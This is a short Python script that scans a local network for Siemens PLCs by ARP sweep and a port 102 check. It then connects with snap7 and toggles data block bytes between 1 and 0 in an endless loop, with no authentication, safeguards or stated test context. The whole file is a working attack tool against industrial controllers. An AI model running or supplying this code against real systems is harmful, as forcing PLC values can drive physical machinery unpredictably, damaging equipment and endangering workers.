import snap7
import time
import struct
import logging
from scapy.all import ARP, Ether, srp

# Configure logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# Scan the network for the PLC
def find_plc_ip(network_range="192.168.1.0/24"):
    logging.info("Scanning network to find PLC...")
    
    # Create ARP request
    arp_request = ARP(pdst=network_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp_request

    # Send request and collect response
    result = srp(packet, timeout=2, verbose=0)[0]
    for sent, received in result:
        if received.haslayer(ARP):
            ip = received.psrc
            logging.info(f"Possible PLC found at: {ip}")
            
            # Check if port 102 (Siemens S7Comm) is open
            from socket import socket, AF_INET, SOCK_STREAM
            s = socket(AF_INET, SOCK_STREAM)
            s.settimeout(2)
            try:
                s.connect((ip, 102))
                logging.info(f"Confirmed PLC at {ip} (Port 102 Open)")
                s.close()
                return ip
            except:
                continue
    
    logging.warning("No PLC found on the network.")
    return None

# Function to brute force I/O addresses
def brute_force_io(plc_ip, db_number=1, start_byte=0, end_byte=2):
    logging.info(f"Attempting brute-force I/O changes on PLC at {plc_ip}...")

    try:
        plc = snap7.client.Client()
        plc.connect(plc_ip, 0, 1)

        while True:
            for byte in range(start_byte, end_byte):
                
                # Set value to ON (1)
                data = bytearray([1])
                plc.db_write(db_number, byte, data)
                logging.info(f"Forcing byte {byte} to 1")
                time.sleep(0.5)

                # Set value to OFF (0)
                data = bytearray([0])
                plc.db_write(db_number, byte, data)
                logging.info(f"Forcing byte {byte} to 0")
                time.sleep(0.5)

    except Exception as e:
        logging.error(f"Error: {e}")
    finally:
        plc.disconnect()

# Main execution
if __name__ == "__main__":
    plc_ip = find_plc_ip()
    
    if plc_ip:
        brute_force_io(plc_ip)
    else:
        logging.error("No PLC found. Exiting.")